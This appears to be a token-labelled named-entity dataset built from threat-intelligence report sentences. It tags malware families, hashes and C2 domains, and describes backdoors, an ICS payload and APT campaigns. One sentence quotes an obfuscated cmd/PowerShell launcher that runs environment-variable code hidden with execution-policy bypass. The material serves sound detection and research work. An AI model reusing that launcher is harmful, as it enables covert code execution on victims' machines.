file	O
is	O
used	O
for	O
the	O
actual	O
communication	O
and	O
the	O
two	O
other	O
COM	O
ports	O
are	O
just	O
opened	O
to	O
prevent	O
other	O
processes	O
accessing	O
them	O
Thus	O
,	O
the	O
101	O
payload	O
component	O
is	O
able	O
to	O
take	O
over	O
and	O
maintain	O
control	O
of	O
the	O
RTU	O
device	O
This	O
component	O
iterates	O
through	O
all	O
IOAs	O
in	O
the	O
defined	O
IOA	O
ranges	O
For	O
each	O
such	O
IOA	O
it	O
constructs	O
two	O
'	O
select	O
and	O
execute	O
'	O
packets	O
,	O
one	O
with	O
a	O
single	O
command	O
(	O
)	O
and	O
one	O
with	O
a	O
double	O
command	O
)	O
and	O
sends	O
these	O
to	O
the	O
RTU	O
device	O
The	O
main	O
goal	O
of	O
the	O
component	O
is	O
to	O
change	O
the	O
On/Off	O
state	O
of	O
single	O
command	O
type	O
IOA	O
and	O
double	O
command	O
type	O
IOA	O
Specifically	O
,	O
the	O
101	O
payload	O
has	O
three	O
stages	O
:	O
in	O
the	O
first	O
stage	O
this	O
component	O
attempts	O
to	O
switch	O
IOAs	O
to	O
their	O
Off	O
state	O
,	O
in	O
the	O
second	O
stage	O
it	O
attempts	O
to	O
invert	O
IOA	O
states	O
to	O
On	O
,	O
and	O
in	O
the	O
final	O
stage	O
the	O
component	O
switches	O
IOA	O
states	O
to	O
Off	O
again	O
This	O
payload	O
DLL	O
has	O
the	O
filename	O
104	O
dll	O
and	O
is	O
named	O
after	O
IEC	O
104	O
(	O
aka	O

He	O
fingerprinted	O
the	O
Bahrain	O
server	O
and	O
looked	O
at	O
historical	O
Internet	O
scanning	O
data	O
to	O
identify	O
other	O
servers	O
around	O
the	O
world	O
that	O
responded	O
to	O
the	O
same	O
fingerprint	O
.	O

木马分析	O
(	O
3	O
)	O
activities.Victims	O
include	O
trade	O
agencies	O
and	O
related	O
organizations	O
.	O

Figure	O
10	O
:	O
Contents	O
of	O
VBS	O
Script	O

We	O
explained	O
that	O
this	O
case	O
is	O
linked	O
to	O
the	O
Uroburos	B-malware.backdoor
rootkit	I-malware.backdoor
.	O

Performs	O
some	O
copies	O
and	O
operations	O
on	O
this	O
buffer	O
to	O
produce	O
an	O
intermediate	O
buffer	O
;	O
3	O
.	O

While	O
it	O
seems	O
that	O
different	O
operators	O
are	O
responsible	O
for	O
these	O
two	O
campaigns	O
,	O
our	O
research	O
showed	O
that	O
these	O
operators	O
share	O
a	O
number	O
of	O
common	O
tools	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
.	O

blogdns[.]com	B-url.cncsvr
lcl918_NewCT	O
46ac122183c32858	B-hash
581e95ef40bd31b3	I-hash
CT	O
V2.1	O
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
IntelAMTPP	O
.	O

This	O
report	O
focuses	O
on	O
the	O
CopyKittens	B-malware.backdoor
,	O
a	O
mid-level	O
group	O
.	O

What	O
we	O
have	O
presented	O
here	O
are	O
forensically	O
sound	O
methods	O
that	O
are	O
easily	O
repeatable	O
and	O
least	O
damaging	O
to	O
the	O
evidence/image	O
.	O

It	O
encodes	O
every	O
string	O
that	O
can	O
be	O
useful	O
for	O
quick	O
analysis	O
.	O

Furthermore	O
,	O
the	O
strings	O
in	O
the	O
sample	O
are	O
obfuscated	O
.	O

The	O
ZxShell	B-malware.backdoor
driver	O
starts	O
by	O
acquiring	O
some	O
kernel	O
information	O
and	O
then	O
hooking	O
'	O
ObReferenceObjectByHandle	O
'	O
API	O
.	O

It	O
ensures	O
this	O
by	O
checking	O
if	O
the	O
return	O
value	O
from	O

T	O
he	O
tool	O
helps	O
penetration	O
testers	O
to	O
collect	O
information	O
on	O
the	O
subdomains	O
of	O
the	O
domain	O
they	O
are	O
researching	O
.	O

According	O
to	O
above	O
information	O
,	O
we	O
can	O
not	O
make	O
sure	O
this	O
leading	O
sample	O
has	O
relationship	O
with	O
this	O
APT	O
incident	O
.	O

&	O
&	O
set	O
xmd=echo	O
iex	O
(	O
ls	O
env	O
:	O
tjdm	O
)	O
.value	O
^	O
|	O
powershell	O
-noni	O
-noex	O
-execut	O
bypass	O
-nopro le	O
-wind	O
hidden	O
–	O
&	O
&	O
cmd	O
/C	O
%	O
xmd	O
%	O
The	O
extracted	O
script	O
is	O
heavily	O
disguised	O
,	O
using	O
a	O
combination	O
of	O
string-format	O
operator	O
obfuscation	O
and	O
other	O
string-based	O
obfuscation	O
techniques	O
.	O

The	O
attackers	O
used	O
this	O
technique	O
to	O
delay	O
,	O
divert	O
and	O
confuse	O
the	O
manual	O
analysis	O
.	O

The	O
basic	O
method	O
in	O
this	O
case	O
,	O
an	O
in-memory	O
implant	O
using	O
PowerShell	O
along	O
with	O
obfuscation	O
to	O
avoid	O
detection	O
,	O
is	O
a	O
common	O
and	O
increasing	O
popular	O
 leless	O
technique	O
used	O
in	O
cyberattacks	O
.	O

5	O
Sept	O
.	O

The	O
decoy	O
documents	O
and	O
filenames	O
used	O
in	O
the	O
attacks	O
suggest	O
the	O
intended	O
targets	O
include	O
organisations	O
with	O
political	O
interests	O
or	O
influence	O
in	O
Israel	O
and	O
Palestine	O
.	O

This	O
time	O
the	O
marker	O
string	O
points	O
to	O
the	O
beginning	O
of	O
the	O
encrypted	O
server	O
service	O
name	O
.	O

edc83f5b08d3d009e60f3700d6a273da	B-hash
SHA-1	O
SHA-256	O
File	O
Size	O
8f338c7afb4346e8fe9f8db289b6fc6a03e68378	B-hash
d3c30cc8fb8f049ca6d448466f7440e175b53dcdf7d7e769c34693d43d858b06	B-hash
378	O
KB	O

This	O
backdoor	O
program	O
has	O
several	O
capabilities	O
that	O
are	O
outlined	O
below	O
.	O

The	O
VBS	O
code	O
also	O
creates	O
a	O
file	O
in	O
C	O
:	O
\Users\Public\Administrador\car.dat	O
with	O
random	O
strings	O
.	O

In	O
Q4	O
of	O
2017	O
,	O
a	O
similar	O
malspam	O
campaign	O
delivered	O
the	O
same	O
banking	O
Trojan	O
by	O
using	O
an	O
embedded	O
JAR	O
file	O
attached	O
in	O
the	O
email	O
instead	O
of	O
an	O
HTML	O
attachment	O
.	O

Operation	O
BugDrop	O
is	O
a	O
well-organized	O
operation	O
that	O
employs	O
sophisticated	O
malware	O
and	O
appears	O
to	O
be	O
backed	O
by	O
an	O
organization	O
with	O
substantial	O
resources	O
.	O

5	O
2016년	O
11월부	O
터	O
공격을	O
시도한	O
것으로	O
보이며	O
,	O
공격에	O
사용된	O
악성코드는	O
2016년	O
관사	O
관련	O
기관의	O
자료	O
유출에	O
사	O
용된	O
악성코드와	O
유사했다	O
.	O

r/rr-xr-xr-x00	O
26395-128-5	O
C	O
:	O
/WINDOWS/Installer/	O
{	O
49FD463C-18F1-63C4-8F12-49F518F127	O
}	O
/09e493e2-05f9-4899-b661-c52f3554c644	O

Cylance	O
has	O
observed	O
the	O
following	O
ZIP	O
files	O
which	O
contained	O
a	O
similarly	O
named	O
executable	O
:	O
)	O
.zip	O
•	O
2016	O
A4	O
1025.zip	O
•	O
11	O

targattacks	O

This	O
POST	O
request	O
containing	O
the	O
password	O
is	O
sent	O
to	O
another	O
server-side	O
script	O
,	O
called	O
/upload864	O
.	O

13	O
.	O

The	O
targets	O
While	O
root9B	O
's	O
discovery	O
began	O
with	O
servicing	O
their	O
own	O
customers	O
,	O
their	O
analysis	O
has	O
revealed	O
an	O
adversary	O
pattern	O
that	O
has	O
enabled	O
the	O
identification	O
of	O
previously	O
unknown	O
target	O
vectors	O
.	O

In	O
addition	O
to	O
the	O
above	O
behavior	O
,	O
EvilGrab	B-malware.drop
also	O
creates	O
the	O
following	O
registry	O
entry	O
to	O
enable	O
its	O
automatic	O
execution	O
at	O
every	O
system	O
startup	O
:	O
The	O
file	O
is	O
a	O
copy	O
of	O
one	O
of	O
the	O
malware	O
components	O
.	O

We	O
do	O
not	O
know	O
what	O
was	O
the	O
content	O
in	O
the	O
final	O
URL	O
.	O

isActiveChannel	O
]	O

There	O
was	O
one	O
unique	O
case	O
we	O
found	O
where	O
the	O
initial	O
dropper	O
was	O
a	O
self­extracting	O
archive	O
that	O
utilizes	O
Visual	O
Basic	O
and	O
batch	O
scripts	O
to	O
download	O
and	O
install	O
the	O
DLL	O
instead	O
of	O
extracting	O
it	O
from	O
a	O
resource	O
.	O

First	O
,	O
they	O
register	O
a	O
special	O
window	O
for	O
it	O
:	O
In	O
the	O
window	O
procedure	O
,	O
they	O
post	O
WM_DDE_EXECUTE	O
messages	O
with	O
commands	O
:	O

By	O
phone	O

PCC_CMD	O
:	O
:ReadWaitingData	O
member	O
function	O
is	O
responsible	O
for	O
transmitting	O
any	O
of	O
the	O
previously	O
queued	O
packets	O
from	O
PCC_CMD	O
:	O
:ProcessPacketEx	O
.	O

The	O
deployment	O
of	O
anti-virus	O
software	O
,	O
intrusion	O
detection	O
systems	O
,	O
firewalls	O
and	O
other	O
malware	O
detection	O
or	O
prevention	O
technology	O
has	O
done	O
much	O
to	O
defend	O
against	O
many	O
attacks	O
.	O

An	O
in-depth	O
analysis	O
of	O
the	O
FinSpy	B-malware.backdoor
Mobile	O
suite	O
of	O
backdoors	O
was	O
provided	O
in	O
an	O
earlier	O
blog	O
post	O
:	O
The	O
Smartphone	O
Who	O
Loved	O
Me	O
:	O
FinFisher	B-malware.backdoor
Goes	O
Mobile	O
?	O

Over	O
the	O
course	O
of	O
their	O
correspondence	O
,	O
suggested	O
using	O
WhatsApp	O
to	O
communicate	O
.	O

3.5.2	O
INVADING	O
DESKTOP	O
PROCESSES	O

Varying	O
the	O
cloud	O
service	O
provider	O
used	O
adds	O
a	O
further	O
degree	O
of	O
stealth	O
.	O

Trend	O
Micro	O
refers	O
to	O
activity	O
corresponding	O
to	O
FireEye	O
's	O
APT28	B-malware.infosteal
as	O
'	O
Pawn	O
Storm	O
.	O
'	O

Some	O
of	O
the	O
binaries	O
are	O
also	O
self­signed	O
:	O
So	O
what	O
can	O
this	O
malware	O
do	O
?	O

A	O
more	O
detailed	O
explanation	O
of	O
this	O
can	O
be	O
found	O
here	O
.	O

Gallagher	O
,	O
Sean	O
.	O

These	O
include	O
Getpass.exe	O
and	O
Mail.exe	O
,	O
which	O
are	O
password	O
and	O
information	O
stealers	O
.	O

Figure	O
20	O
:	O
Host	O
Recon	O
Data	O
Sent	O
to	O
First	O
C2	O
Server	O

The	O
Washington	O
Post	O
.	O

2	O
.	O

Monitor	O
and	O
remove	O
any	O
unauthorized	O
code	O
present	O
in	O
any	O
www	O
directories	O
.	O

If	O
the	O
system	O
date	O
was	O
after	O
the	O
hard	O
coded	O
dates	O
,	O
the	O
malware	O
would	O
delete	O
itself	O
and	O
terminate	O
.	O

While	O
AIS	O
will	O
not	O
eliminate	O
sophisticated	O
cyber	O
threats	O
,	O
it	O
will	O
allow	O
companies	O
and	O
federal	O
agencies	O
to	O
concentrate	O
more	O
on	O
them	O
by	O
clearing	O
away	O
less	O
sophisticated	O
attacks	O
.	O

10	O
.	O

Table	O
1	O
highlights	O
some	O
recent	O
examples	O
of	O
this	O
activity	O
.	O

The	O
Gmail	O
address	O
is	O
connected	O
to	O
a	O
Facebook	O
account	O
,	O
probably	O
of	O
a	O
fake	O
identity	O
-	O
Montaser	O
Ali	O

One	O
possible	O
hit	O
was	O
triggered	O
when	O
we	O
observed	O
Mevade	B-malware.unknown
,	O
an	O
unusual	O
piece	O
of	O
malware	O
that	O
appeared	O
late	O
in	O
2013	O
.	O

Asruex	B-malware.drop
executes	O
commands	O
that	O
are	O
received	O
from	O
a	O
C	O
&	O
C	O
server	O
.	O

SPLM	B-malware.backdoor
did	O
not	O
change	O
in	O
substantial	O
ways	O
for	O
several	O
years	O
,	O
and	O
now	O
it	O
is	O
being	O
split	O
up	O
and	O
used	O
for	O
just	O
functional	O
modules	O
.	O

Storm	O
,	O
Sednit	O
,	O
Sofacy	O
,	O
it	O
has	O
least	O
2007	O
and	O
The	O
group	O
was	O
involved	O
also	O
in	O
the	O
string	O
of	O
attacks	O
that	O
targeted	O
2016	O
Presidential	O
election	O
.	O

The	O
malware	O
persistence	O
uses	O
a	O
registry	O
key	O
in	O
order	O
to	O
be	O
executed	O
automatically	O
in	O
case	O
the	O
system	O
is	O
rebooted	O
.	O

Version	O
3.20	O
uses	O
the	O
following	O
CLSID	O
in	O
order	O
to	O
hijack	O
COM	O
object	O
:	O
B196B286-BAB4-101A-B69C-00AA00341D07	O
.	O

45899	O
-	O
VNPT-AS-VN	O
VNPT	O
Corp	O

2/12	O

One	O
of	O
most	O
notable	O
changes	O
on	O
the	O
new	O
RATANKBA	B-malware.backdoor
variant	O
is	O
that	O
the	O
new	O
version	O
was	O
written	O
in	O
Powershell	O
,	O
whereas	O
the	O
original	O
variant	O
was	O
in	O
PE	O
form	O
.	O

The	O
VBS	O
also	O
adds	O
a	O
registry	O
key	O
:	O

Once	O
it	O
became	O
known	O
Inception	B-malware.backdoor
was	O
using	O
a	O
single	O
provider	O
,	O
any	O
tra c	O
to	O
that	O
provider	O
may	O
have	O
attracted	O
additional	O
scrutiny	O
.	O

The	O
main	O
distribution	O
of	O
samples	O
goes	O
back	O
to	O
2005	O
with	O
possible	O
earlier	O
outliers	O
.	O

Upon	O
returning	O
from	O
the	O
'	O
_check	O
'	O
function	O
,	O
the	O
dropper	O
will	O
perform	O
a	O
simple	O
comparison	O
and	O
if	O
an	O
analysis	O
machine	O
has	O
been	O
detected	O
,	O
it	O
will	O
signal	O
the	O
attackers	O
again	O
using	O
almost	O
the	O
same	O
URL	O
as	O
it	O
did	O
before	O
but	O
replacing	O
the	O
name	O
of	O
the	O
'	O
.png	O
'	O
file	O
to	O
the	O
letter	O
'	O
n	O
'	O
concatenated	O
with	O
the	O
number	O
of	O
the	O
artifact	O
found	O
by	O
Pafish	O
.	O

Please	O
see	O
the	O
Attacker	O
's	O
Arsenal	O
section	O
for	O
detailed	O
analysis	O
of	O
the	O
tools	O
.	O

These	O
operations	O
present	O
somewhat	O
of	O
a	O
problem	O
for	O
older	O
disassemblers	O
such	O
as	O
the	O
original	O
Ollydbg	O
,	O
but	O
are	O
trivially	O
patched	O
.	O

A	O
global	O
hook	O
is	O
installed	O
by	O
calling	O
SetWindowsHookEx	O
by	O
passing	O
the	O
thread	O
ID	O
zero	O
.	O

3a9237deaf25851f2511e355f8c506d7	B-hash

This	O
data	O
block	O
is	O
confi	O
gurable	O
before	O
the	O
malware	O
is	O
deployed	O
.	O

WADA	O
officials	O
,	O
citing	O
evidence	O
provided	O
by	O
law	O
enforcement	O
,	O
stated	O
that	O
the	O
threat	O
activity	O
originated	O
in	O
Russia	O
,	O
possibly	O
in	O
retaliation	O
for	O
WADA	O
's	O
exposure	O
of	O
Russia	O
's	O
expansive	O
,	O
state-run	O
doping	O
.	O

In	O
the	O
space	O
of	O
just	O
4	O
kilobytes	O
,	O
the	O
Web	B-malware.ransom
shell	O
offers	O
file	O
and	O
database	O
management	O
,	O
code	O
obfuscation	O
,	O
and	O
more—all	O
in	O
an	O
easy-to-use	O
graphical	O
user	O
interface	O
that	O
even	O
novices	O
can	O
use	O
.	O

In	O
sum	O
,	O
we	O
believe	O
that	O
these	O
groups	O
are	O
from	O
two	O
distinct	O
regions	O
in	O
China	O
and	O
possibly	O
(	O
1	O
)	O
are	O
collaborating	O
,	O
(	O
2	O
)	O
received	O
the	O
same	O
training	O
,	O
(	O
3	O
)	O
have	O
a	O
common	O
toolkit	O
supply	O
chain	O
,	O
or	O
some	O
combination	O
of	O
these	O
three	O
.	O

The	O
binary	O
then	O
spawns	O
a	O
new	O
thread	O
that	O
contains	O
the	O
main	O
server	O
variant	O
code	O
in	O
order	O
to	O
allow	O
the	O
DllEntryPoint	O
routine	O
to	O
return	O
to	O
the	O
calling	O
function	O
.	O

다음	O
은	O
세	O
종류의	O
중앙관리	O
솔루션의	O
클라이언트	O
에이전트의	O
취약점을	O
이용해	O
파일을	O
전송한	O
사례다	O
.	O

The	O
first	O
available	O
visitor	O
redirects	O
from	O
winrar[.]be	B-url.normal
to	O
ralrab[.]com	B-url.normal
first	O
appeared	O
on	O
May	O
28th	O
,	O
2016	O
,	O
from	O
the	O
dutch	O
speaking	O
version	O
of	O
the	O
winrar.be	B-url.normal
site	O
.	O

Its	O
length	O
is	O
13	O
=	O
0x0d	O
,	O
and	O
the	O
two	O
random	O
bytes	O
are	O
0xf3	O
and	O
0x92	O
.	O

Knowledge	O
of	O
DRAGONFISH	O
's	O
tactics	O
,	O
techniques	O
,	O
and	O
procedures	O
(	O
TTPs	O
)	O
helps	O
to	O
better	O
inform	O
detection	O
and	O
response	O
to	O
attacks	O
by	O
this	O
threat	O
group	O
.	O

The	O
document	O
was	O
created	O
on	O
December	O
27	O
at	O
15:52	O
by	O
the	O
author	O
'	O
John	O
.	O
'	O

29	O
.	O

One	O
of	O
its	O
file	O
stealers	O
,	O
swissknife2	B-malware.infosteal
,	O
abuses	O
a	O
cloud	O
storage	O
service	O
as	O
a	O
repository	O
of	O
exfiltrated	O
files	O
.	O

It	O
is	O
worth	O
noting	O
that	O
these	O
samples	O
were	O
all	O
compiled	O
after	O
the	O
domain	O
began	O
being	O
used	O
alongside	O
the	O

iframe	O

We	O
also	O
identified	O
another	O
document	O
exploiting	O
CVE-2012-0158	O
,	O
but	O
this	O
time	O
apparently	O
targeting	O
some	O
Indian	O
individuals	O
.	O

1	O
*	O
http://news.grouptumbler.com/	O

14	O
.	O

The	O
response	O
is	O
then	O
parsed	O
and	O
passed	O
to	O
the	O
second	O
thread	O
that	O
acts	O
as	O
the	O
worker	O
.	O

Friday	O
,	O
July	O
24	O
,	O
2015	O
By	O
choosing	O
common	O
VPN	O
software	O
there	O
is	O
a	O
high	O
chance	O
that	O
the	O
chosen	O
vendor	O
's	O
software	O
may	O
be	O
in	O
use	O
within	O
the	O
intended	O
victim	O
's	O
corporate	O
environment	O
.	O

Figure	O
4	O
:	O
XYTvn	O
static	O
packet	O
flag	O
|	O
Victim	O
to	O
controller	O
login	O
request	O

The	O
discoveries	O
that	O
we	O
made	O
while	O
investigating	O
the	O
command	O
and	O
control	O
infrastructure	O
associated	O
with	O
this	O
campaign	O
suggest	O
that	O
these	O
attackers	O
are	O
'	O
hired	O
guns	O
'	O
and	O
have	O
multiple	O
operations	O
against	O
different	O
targets	O
going	O
on	O
at	O
the	O
same	O
time	O
.	O

We	O
do	O
not	O
believe	O
this	O
developer	O
is	O
part	O
of	O
the	O
core	O
group	O
that	O
has	O
access	O
to	O
the	O
original	O
implementation	O
,	O
but	O
is	O
instead	O
another	O
actor	O
,	O
who	O
is	O
likely	O
rebuilding	O
ScanBox	B-malware.infosteal
from	O
samples	O
they	O
find	O
online	O
.	O

Each	O
list	O
of	O
characters	O
consists	O
of	O
the	O
set	O
found	O
within	O
the	O
API	O
function	O
name	O
the	O
payload	O
seeks	O
to	O
add	O
to	O
its	O
IAT	O
,	O
while	O
the	O
corresponding	O
list	O
of	O
numbers	O
specifies	O
the	O
offset	O
in	O
the	O
function	O
name	O
where	O
those	O
characters	O
should	O
be	O
placed	O
.	O

For	O
example	O
,	O
we	O
have	O
observed	O
the	O
following	O
:	O

In	O
order	O
to	O
retrieve	O
the	O
server	O
IP	O
address	O
,	O
the	O
backdoor	O
first	O
creates	O
a	O
particular	O
DNS	O
query	O
.	O

We	O
were	O
able	O
to	O
access	O
this	O
backend	O
,	O
which	O
provided	O
us	O
with	O
valuable	O
information	O
about	O
this	O
attack	O
and	O
its	O
victims	O
.	O

Curiously	O
though	O
,	O
the	O
regsvr32.exe	O
process	O
used	O
to	O
load	O
the	O
dropped	O
implant	O
remains	O
running	O
.	O

00b61db083b07a64fb6072b42aa83dc1	B-hash
0136ab6d2e507d4e63990b196121d41c	B-hash
017c03ad61f89ee6597ead40cc552aef	B-hash
019cb1a6776f0e0d353814711e9e171b	B-hash
02043566d027445374a1f7f0fc35d495	B-hash
025dc68c8e06d6488e338dcc55b295eb	B-hash
026c1532db8125fbae0e6aa1f4033f42	B-hash
02c9a3c3efd52e43dbf53e0995a7a24e	B-hash
051caf12c36662d946fd0146cd199db5	B-hash
05269f5236bd89b66f6f4694abef6222	B-hash
05c63c450d4d2aeb23053a6b6f8275b0	B-hash
05df8d890eb18614a7d206b41453d306	B-hash
086e91fa95136ad1d814cac327543bf9	B-hash
08ac41ce00bf436a3dc23c4639d5f5ed	B-hash
0925fb0f4c06f8b2df86508745dbacb1	B-hash
09a6d5b54e8c48ed33189ebf80df750d	B-hash
09c0f3a3099b6b38ec36d001361edd98	B-hash
0a98bfa4bef1eb755c9c154963b69dc8	B-hash
0aa4e635a61038a621d9264e33b4bc3f	B-hash
0b33a683812124d99de45c8e84dc9013	B-hash
0b6755e61840378952d69630b5c23e41	B-hash
0c6f8665dd18d5e86124c7bfbf3207f0	B-hash
0cdfea216d117cc97845edb9becaa498	B-hash
0d335de3c082627cd0c5699aa6012b7d	B-hash
0f1dd1bef76967a6b06a5e0432ca947b	B-hash
0f4432d54b28aafc976b5950d5337a5f	B-hash
1285ff3c3a4089b43c275220d0c54442	B-hash
1286c678b3a821dec8c8cc1125bd2bc0	B-hash
12c64a64ae32fd3dff75347dde2aafac	B-hash
13eb87290affe1360834037d9d400b39	B-hash
1475f178b6a86d3922b3e2c6fc59512d	B-hash
14d17aaa3016a618a3ede92511fdd339	B-hash
16710c96d5ee6554bae6b881d9e136bd	B-hash
17173efe0062114d2f993c7584520c1a	B-hash
18575542dc4e9aa5aa8eeda14c26e46a	B-hash
18a3bf5d8336f075ba503622880b5025	B-hash
19bc509f31f33a8f473ef9d671c1828b	B-hash
1b517ea2aae0ed0a71f6e74e34e860e1	B-hash
1bc363e4ad9fc3be4953dd3eaa2bdb76	B-hash
1d1e2c7bb5a9fa546a6b0ae3c308db61	B-hash
1d69504a3d3ac32275fa4df8af25d1f7	B-hash
1ee30f7ecaf25af38cf684ca56b75cf2	B-hash
1f9cf9f1b5738198674a58a378b0d7e1	B-hash
218bbd007898e6b6fc754fe5c76668fc	B-hash
21ed762e867cdabbb194aba878530c88	B-hash
22e10cbe46f406f5f1be0d613db4c2c3	B-hash
241e8465fd4d99a3f446d7f75957522b	B-hash
24be0dd53bb43bb6cd08044b21a6aaaa	B-hash
2500494616f4e7e1fa14fb3a46f468a7	B-hash
255b1aaff69668ac19906219d36c607c	B-hash
271dad1471efd9bfc1a9dc05d6c30a24	B-hash
27fb01f7b3137921126ba086da4e6a2c	B-hash
280531bb85998ff3dc7eb8d057525ffe	B-hash
2997ec540932ea6b1fe0cab555b939d8	B-hash
299ca1f787d2340d34407ef084845260	B-hash
2a3aca1b002c6894c5edcc5e25a8f970	B-hash
2b3faf2856c220aa8b87632ac8bbd1a5	B-hash
2c4cabb4ca19ddf87c7f11bad44bdf05	B-hash
2cf5b5a9333d159b664725811465d1a3	B-hash
2d0318507bc4c1958913b31009de37f8	B-hash
2dbbadc147f11f2a856a648cdc332c0e	B-hash
2e7a8e7e9d8d62c94d011e86de9cb12a	B-hash
2f37912e7cb6e5c478e6dc3d0e381a24	B-hash
2f6c8da1c5f397bea7b300d28b3ad4ba	B-hash
2f7918548b0aa59f23a1c16aa98e058b	B-hash
30e81a30471c8f63b4688533252b56fa	B-hash
320b4bd876004c1f0455f6f48b07e164	B-hash
32e474b21555d3946970c73648d88b36	B-hash
33a03ca462cec85e33dba0a1dcb9aee0	B-hash
356e11813fed7623a77610e836bcab65	B-hash
3599a78c7e99b451c00d3490f17f842f	B-hash
35ae79bbe9f560b9634ce28b6569bd0f	B-hash
35ed31733fbd7eeb4bfcc29e28a8496f	B-hash
36ca00585d13d6911f086f0d2d496f96	B-hash
370947e6c802d21a732ac0cc024c4fcf	B-hash
37b1e5809dd5a92a1d73f0e36af6791e	B-hash
399c41047abd99b6e86d04b7dd444509	B-hash
3b266b165468b810cd456cdf88ca8619	B-hash
3b6a1f6ad4b8141b1aed8644d789706f	B-hash
3b8ada8eda04f204164449a0fec0c296	B-hash
3b9cc9e174ad19380efef2744b7ff046	B-hash
3c058ca758f97cd2ae56df8a08f6a5a3	B-hash
3c9aa6dc8c4501ffa2798f044df53438	B-hash
3ce55c6994101faec00b5b7c2fee494f	B-hash
3d41375ee362f4265ea2e90b9a08f0dd	B-hash
3f637c1477442d92962be4ed427bb1cd	B-hash
3f9e63ee4ae254778c69369fedf0d999	B-hash
3fb6039a572369d8d23fb99987ea21a9	B-hash
3fc2aa493492e6d7560ac8a5d69d7cbd	B-hash
3fecd601404abda8f793ff5cc7ecf973	B-hash
41998b32ab11e474b167edf9dbb59b12	B-hash
4248d33b4273a80d11d6b3b6297851eb	B-hash
4287353240e4e473e940a9289a48a333	B-hash
42acd0ed699d94602a0494f65a328615	B-hash
431f635eb68b936182d73bf6db06fc97	B-hash
43e128cfd0080a644e4ce98f84e29e8e	B-hash
43f3a0a82397400a181c080992d35a5b	B-hash
4602735e4a8754ff7f5a8785f9fd336a	B-hash
467b90773754e35e1535a164140be005	B-hash
46b3b305530fb68f7a88b8453e4866ea	B-hash
4890bf4c2d68657969e1cd11e0ae2648	B-hash
4899aa64923115886dd7cff5fff5ea1c	B-hash
491db327f479a1a34898229811fa8a5d	B-hash
49cc5f649e9098530ceeb2ea45346a9d	B-hash
4b03db464b22536f700c99c3bd36e9e2	B-hash
4c136f1fbd9d7010369ae5644a8af4b0	B-hash
4cd5a29a7fc904aaaccbca9e30e0a865	B-hash
4cdfb56105b07f463d046fb425567cb0	B-hash
4ce22cee6abcb37db757e3fd60970090	B-hash
4dc2bcad31fb36f0913e441deeda8121	B-hash
4e5ed120295d9937de106fc703e64732	B-hash
4f13bd1db43e54d2cd2427a87ddb8e22	B-hash
507fa8a735417219d6b881834f660cb2	B-hash
5084ddfb90791516015c02c68d58fe5d	B-hash
5106b19a9a29f0228782e0cafcd1cc2e	B-hash
516c2981f3506ede7608ef2f273c6aed	B-hash
534b3650b350b503e0f0f3bb6dd7598c	B-hash
53d1e354104d5fc028d83aa519c1d1c6	B-hash
551aa0ab2b40fa7d891664caf0da879b	B-hash
5621ed9c3b844654141c1a5ea7ca8c0d	B-hash
578dbadaa5086e24d576328b7d4fedba	B-hash
57bc1531a12179c5794d5c99b8442eba	B-hash
582207d1f939f80bacc36a7790f40dc8	B-hash
582e827a539b6243f1c90b720fc143a4	B-hash
5aea3a20553a07fa50c4e815cf9ba7ff	B-hash
5afdb5db234a1a13f5449be25f114999	B-hash
5ba8c4ef080e61310943fcb3c68bf002	B-hash
5bdb1b2313541f4cdc967391a4d150f4	B-hash
5c43e4ac0a6ad74844b2a310f1abc1c7	B-hash
5ca21c7986db58d44306e94f1ea6ae5c	B-hash
5d1d18c697eefb03e120d9ef3f53dd28	B-hash
5e8d1334238dfaf5f11d7f2186989095	B-hash
5fee0adbac53eee82626daa5c5f99aba	B-hash
607b46c73adb9a8bf03f5cd038871347	B-hash
628e4933864d3f712670658a93d11113	B-hash
62ccc75782d657850b85456ab48f2277	B-hash
633d92d13c2e8330cb4a3bc5130ab84f	B-hash
640a64136516298ca80490d75a365695	B-hash
640fbb5f8938ea45204de6496240f82a	B-hash
6414217bafb6f4c058773b0134e56e99	B-hash
64b865afdc34091a9c02700adeea5853	B-hash
655d1322795ed9532390ccf2e8f726f8	B-hash
659300af2f7c9e76f55464b21784a7f6	B-hash
659fb07c70034571de7a1b4b5ac86b01	B-hash
66060b82f299c14e18b65d21d277a49e	B-hash
668731574fa9ad7567fb4854805a3fb2	B-hash
66e4538702381035dc62247080d4593f	B-hash
6757128a636e2c509861d4f75ff128f1	B-hash
67a8b964857fe499b62442308a767e94	B-hash
6827e494a230a1483e19c205c532df17	B-hash
685e10f1393eaee470224b7fe1359202	B-hash
688ba2b3739ad54dee4139a727e457cc	B-hash
6981364b6f1142363c151b11da66cc98	B-hash
6993ed604acd3e17a7bafcfdc2b27898	B-hash
6a0280f169d233a0bdc81ee6a70ef817	B-hash
6b8585ffbdf90c9b120ac1a79fa4dc51	B-hash
6bc6bacbbbacf369fea145d9044bd863	B-hash
6c5b2712a66db42b960aef5b87590033	B-hash
6e67fc27a49769f5218824d405d8fce5	B-hash
6f1c70d77e2571fe8a402aa1a8b7e8cd	B-hash
6fd6aa2a4038903ed6d8e5771689f7c1	B-hash
700941e4fa44941b18844c9bfb3474dc	B-hash
70320b5c719c70c860a55cec7ef173e8	B-hash
709d6eff31854fad212f83a91a900920	B-hash
70fef3c8073e97980b60b4ad8388ab5d	B-hash
716978305d76e1e458c480d80f24caca	B-hash
718179479dd9bd93beae66665e452c87	B-hash
718fcf2a80348110f519a000854e9e0e	B-hash
71de04a952f8c09243c15a7fa5371073	B-hash
71fd3ea6c3e7e2f1eba9d7e911b1cffe	B-hash
7228ac8f341f6ecaff45c8163f421f14	B-hash
76000c77ea9a214f5b2ae8cc387809db	B-hash
7715864443576c824cdc9f39ffacd9dc	B-hash
7b81fa4334cf0e520269f5484fef9fca	B-hash
7bcdd0e5996e849d1068fcffdec81371	B-hash
7bee4b7d948433a58b18d2189d480a29	B-hash
7cd15bb31ff889e81f370d0535e02493	B-hash
7d00ea1262125b2b0469dd639b810823	B-hash
7d101cc3b87ac51c0c1ca8a4371bc84a	B-hash
7d21e2b1b293f4176ba1d8abc2460328	B-hash
7e75928b5ce3dd41c9b9b1e67cff16d6	B-hash
7f7cc1a8d7a6bbe6a52c94bb7f41f727	B-hash
7f90942ace185ca1ba5610f6eddf3376	B-hash
8027234685f88f3b74c45b245c841843	B-hash
802a3965e42e75cc3dcd5f5523929859	B-hash
80ba5a336a4044c1406774d56e130e7e	B-hash
80c58de2dbd1571228b538c9556cd29d	B-hash
824bee27f10d5c81879657c8a2af9f0c	B-hash
82c598abdf848c6fef03c63f5cf7feaf	B-hash
